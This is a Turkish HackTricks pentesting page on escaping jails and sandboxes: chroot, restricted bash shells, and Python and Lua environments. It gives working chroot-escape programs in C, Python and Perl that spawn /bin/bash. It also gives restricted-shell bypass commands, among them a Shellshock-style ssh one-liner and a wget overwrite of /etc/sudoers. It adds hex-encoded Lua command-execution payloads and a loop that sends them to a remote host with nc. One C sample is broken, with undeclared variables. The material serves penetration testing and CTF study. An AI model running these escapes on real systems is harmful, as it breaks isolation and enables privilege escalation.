# Jailer'dan Kaçış

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## **GTFOBins**

**"Shell" özelliği ile herhangi bir ikili dosyayı çalıştırıp çalıştıramayacağınızı kontrol edin** [**https://gtfobins.github.io/**](https://gtfobins.github.io).

## Chroot Kaçışları

[wikipedia'dan](https://en.wikipedia.org/wiki/Chroot#Limitations): Chroot mekanizması, **yetkili** (**root**) **kullanıcılar** tarafından kasıtlı müdahalelere karşı **savunma yapmak için tasarlanmamıştır**. Çoğu sistemde, chroot bağlamları düzgün bir şekilde yığılmamaktadır ve yeterli ayrıcalıklara sahip chroot edilmiş programlar **çıkmak için ikinci bir chroot gerçekleştirebilir**.\
Genellikle bu, chroot içinde root olmanız gerektiği anlamına gelir.

{% hint style="success" %}
**chw00t** [**aracı**](https://github.com/earthquake/chw00t), aşağıdaki senaryoları kötüye kullanmak ve `chroot`'dan kaçmak için oluşturulmuştur.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Eğer bir chroot içinde **root** iseniz, **başka bir chroot** oluşturarak **kaçabilirsiniz**. Bunun nedeni, 2 chroot'un (Linux'ta) bir arada var olamayacağıdır, bu yüzden bir klasör oluşturup ardından **o yeni klasörde yeni bir chroot oluşturursanız** ve **bunun dışında olursanız**, artık **yeni chroot'un dışında** olacaksınız ve dolayısıyla FS'de olacaksınız.

Bu, genellikle chroot'un çalışma dizininizi belirtilen yere taşımadığı için olur, bu nedenle bir chroot oluşturabilirsiniz ama onun dışında olursunuz.
{% endhint %}

Genellikle bir chroot hapishanesinde `chroot` ikili dosyasını bulamazsınız, ancak bir ikili dosyayı **derleyebilir, yükleyebilir ve çalıştırabilirsiniz**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>Python
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Kaydedilmiş fd

{% hint style="warning" %}
Bu, önceki duruma benzer, ancak bu durumda **saldırgan mevcut dizine bir dosya tanımlayıcısı kaydediyor** ve ardından **yeni bir klasörde chroot oluşturuyor**. Son olarak, chroot'un **dışında** o **FD'ye** **erişimi** olduğundan, ona erişiyor ve **kaçıyor**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD, Unix Domain Sockets üzerinden geçirilebilir, bu yüzden:

* Bir çocuk süreç oluştur (fork)
* Ebeveyn ve çocuk arasında iletişim kurmak için UDS oluştur
* Çocuk süreçte farklı bir klasörde chroot çalıştır
* Ebeveyn süreçte, yeni çocuk süreç chroot'unun dışında bir klasörün FD'sini oluştur
* Bu FD'yi UDS kullanarak çocuk sürece geçir
* Çocuk süreç bu FD'ye chdir yapar ve çünkü bu chroot'un dışındadır, hapisten kaçacaktır
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Kök cihazı (/) chroot'un içindeki bir dizine monte et
* O dizine chroot yap

Bu Linux'ta mümkündür
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* procfs'i chroot'un içindeki bir dizine monte et (henüz değilse)
* Farklı bir root/cwd girişi olan bir pid arayın, örneğin: /proc/1/root
* O girişe chroot yap
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Bir Fork (çocuk proc) oluştur ve FS'de daha derin bir klasöre chroot yap ve oraya CD yap
* Ebeveyn süreçten, çocuk sürecin bulunduğu klasörü çocukların chroot'unun öncesindeki bir klasöre taşı
* Bu çocuk süreç kendini chroot'un dışında bulacaktır
{% endhint %}

### ptrace

{% hint style="warning" %}
* Bir zamanlar kullanıcılar kendi süreçlerini kendi süreçlerinden hata ayıklayabiliyordu... ama bu artık varsayılan olarak mümkün değil
* Yine de, mümkünse, bir sürece ptrace yapabilir ve içinde bir shellcode çalıştırabilirsiniz ([bu örneğe bakın](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Enumeration

Hapishane hakkında bilgi al:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### PATH'i Değiştir

PATH ortam değişkenini değiştirebilir misiniz kontrol edin
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim Kullanarak
```bash
:set shell=/bin/sh
:shell
```
### Script oluştur

_/bin/bash_ içeriği ile çalıştırılabilir bir dosya oluşturup oluşturamayacağınızı kontrol edin
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH Üzerinden Bash Elde Etme

Eğer ssh üzerinden erişiyorsanız, bir bash shell'i çalıştırmak için bu hileyi kullanabilirsiniz:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Beyan Etmek
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Örneğin sudoers dosyasını üzerine yazabilirsiniz.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Diğer hileler

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**Aşağıdaki sayfa da ilginç olabilir:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Hapisleri

Aşağıdaki sayfada python hapishanelerinden kaçış hakkında hileler:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Hapisleri

Bu sayfada lua içinde erişebileceğiniz global fonksiyonları bulabilirsiniz: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Komut yürütme ile Eval:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Bazı ipuçları **nokta kullanmadan bir kütüphanenin fonksiyonlarını çağırmak için**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Kütüphanenin işlevlerini listele:
```bash
for k,v in pairs(string) do print(k,v) end
```
Not edin ki, önceki tek satırlık komutu **farklı bir lua ortamında her çalıştırdığınızda fonksiyonların sırası değişir**. Bu nedenle, belirli bir fonksiyonu çalıştırmanız gerekiyorsa, farklı lua ortamlarını yükleyerek ve le kütüphanesinin ilk fonksiyonunu çağırarak bir kaba kuvvet saldırısı gerçekleştirebilirsiniz:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Etkileşimli lua shell alın**: Eğer sınırlı bir lua shell içindeyseniz, yeni bir lua shell (ve umarım sınırsız) almak için şunu çağırabilirsiniz:
```bash
debug.debug()
```
## Referanslar

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slaytlar: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
